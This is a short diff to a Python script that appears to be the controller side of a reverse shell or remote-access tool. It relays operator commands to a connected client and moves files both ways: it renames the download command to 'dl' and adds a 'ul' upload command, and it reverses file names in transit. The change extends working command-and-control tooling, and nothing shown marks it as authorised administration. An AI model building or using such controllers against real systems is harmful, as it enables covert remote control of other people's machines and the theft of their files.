@@ -21,7 +21,7 @@ while True:
     input_header = client.recv(1024)
     command = input(input_header.decode()).encode()
 
-    if command.decode("utf-8").split(" ")[0] == "download":
+    if command.decode("utf-8").split(" ")[0] == "dl":
         file_name = command.decode("utf-8").split(" ")[1][::-1]
         client.send(command)
         with open(file_name, "wb") as f:
@@ -31,6 +31,19 @@ while True:
                 read_data = client.recv(1024)
                 if read_data == b"DONE":
                     break
+
+    elif command.decode("utf-8").split(" ")[0] == "ul":
+        file_name = command.decode("utf-8").split(" ")[1][::-1]
+        client.send(command)
+        with open(file_name, "rb") as f:
+            file_data = f.read(1024)
+            while file_data:
+                print("Sending", file_data)
+                client.send(file_data)
+                file_data = f.read(1024)
+            sleep(2)
+            client.send(b"DONE")
+            print("Finished sending data")
 
     if command is b"":
         print("Please enter a command")
